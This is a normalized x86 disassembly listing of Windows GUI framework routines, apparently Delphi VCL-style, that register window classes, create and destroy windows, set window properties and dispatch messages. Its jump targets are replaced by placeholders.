call sub_4488ac
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4488ac
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44d2fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4488d4
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4488d4
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4488d4
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44d344
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403450
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44b16c
mov edx ebx
mov eax edi
call sub_44d2b0
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44b16c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44b16c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44b16c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax edi
call sub_450adc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44b16c
mov eax edi
call sub_44de94
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44cfa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d418
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44b16c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax esi
call sub_450adc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44d290
mov eax ebp
call sub_44dcf8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44d2fc
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44b16c
mov eax esi
call sub_44d060
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a400
sub_44d494
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_41a5d0
mov edx edi
mov eax ebp
call sub_41a5d0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d4f0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44d494
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44d530
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44d4f0
add esp 0x10
retn
sub_44d558
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44d5c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44a5fc
test al al
je r-xdata
mov eax ebx
call sub_44a62c
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403450
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403450
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44d62c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44d74a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c68
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44d5c4
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4507d8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404208
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408c78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d751
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_44d758
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44d919
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_446d58
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_446d58
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d22c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40d22c
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408e2c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_450ae8
push 0x1
mov eax [ esi + 0x68 ]
call sub_4234bc
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44b16c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4507d8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d920
lea eax [ ebp - 0xc0 ]
call sub_403fa4
retn
mov eax esi
mov si 0xffee
call sub_403450
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44d928
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406eac
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44d968
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e454
mov eax esi
call sub_41e3a4
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41e3a4
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41e45c
pop esi
pop ebx
retn
sub_44d9a0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41fca0
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41fc2c
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41fc2c
mov eax esi
call sub_41fca8
add esp 0x10
pop esi
pop ebx
retn
sub_44da08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44d9f4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41a5d0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a5d0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44dae0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44b4a4
mov eax [ ebp - 0x8 ]
push eax
push sub_44d968
mov eax [ ebp - 0x8 ]
push eax
push sub_44d9a0
push ebp
call sub_44da08
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44db3c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_449f2c
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408de0
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408df4
mov ecx eax
mov edx edi
mov eax ebx
call sub_449f3c
mov eax r-xdata
call sub_408e00
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4489e0
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44db94
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44dbe1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dbe8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d22c
sub_44dbf8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41a62c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_41a5d0
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44dc40
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44dbf8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44d494
call sub_44960c
inc edi
dec esi
jne r-xdata
sub_44dcdc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44dcf8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_41a5d0
call sub_44dcf8
inc edi
dec esi
jne r-xdata
sub_44dd58
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403450
mov ebx eax
mov eax edi
call sub_44dcf8
mov eax edi
call sub_44de94
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44dd98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44de6e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44b16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a5d0
call sub_44dd98
inc esi
dec ebx
jne r-xdata
sub_44de94
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44dd98
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44ded4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44dcf8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44de94
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406e94
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44b16c
jmp r-xdata
sub_44df5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44dfb4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44dfa3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dfaa
call sub_4489e0
call sub_427ff4
retn
sub_44dfd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_419174
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406e7c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44b16c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44e08c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_41a5d0
call sub_44dfd4
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_41a5d0
call sub_44dfd4
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44e120
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4507d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e68
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44e08c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e7c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44b16c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44e1b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44a728
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44b238
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e120
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406e68
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_449afc
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44e08c
test eax eax
je r-xdata
mov eax ebx
call sub_461dc8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44b238
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_450adc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4507d8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4507d8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44b16c
sub_44e318
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44b3cc
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44b16c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_423c8c
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_423cc8
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_449b58
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44e420
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_446e44
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44b16c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44e454
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44e574
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
